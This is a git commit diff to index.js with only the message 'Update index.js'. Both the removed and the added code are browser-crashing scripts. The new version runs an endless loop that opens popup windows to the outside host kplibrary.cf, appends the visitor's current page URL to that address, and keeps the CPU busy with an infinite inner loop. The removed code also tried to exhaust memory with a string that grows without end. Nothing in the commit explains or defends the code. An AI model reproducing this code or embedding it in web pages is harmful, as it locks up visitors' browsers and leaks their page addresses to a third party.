6871a57ea227200671fd12006215dbadd718d9b4
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-13 13:25:38 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,27 +1,9 @@
-var myPopup = window.open("site-on-my-domain", "screenX=100");
-if (!myPopup)
-  alert("Please allow pop ups for this website to continue.")
 while (true) {
+  window.open("http://kplibrary.cf/")
+  var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+  var URL = "http://kplibrary.cf/" + location.href;
+  var win = window.open(URL, "_blank", strWindowFeatures);
   setTimeout(function() {
-    txt = "a";
-    while (true) {
-      txt = txt += "a";
-    }
-  }, 50);
-} else {
-  myPopup.onload = function() {
-    setTimeout(function() {
-      if (myPopup.screenX === 0)
-
-        while (true) {
-        window.open("http://kplibrary.cf/")
-        var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
-        var URL = "http://kplibrary.cf/" + location.href;
-        var win = window.open(URL, "_blank", strWindowFeatures);
-        setTimeout(function() {
-          for (var i = 0; i === i; i++) {}
-        }, 5);
-      }
-    }, 0);
-  };
+    for (var i = 0; i === i; i++) {}
+  }, 5);
 }
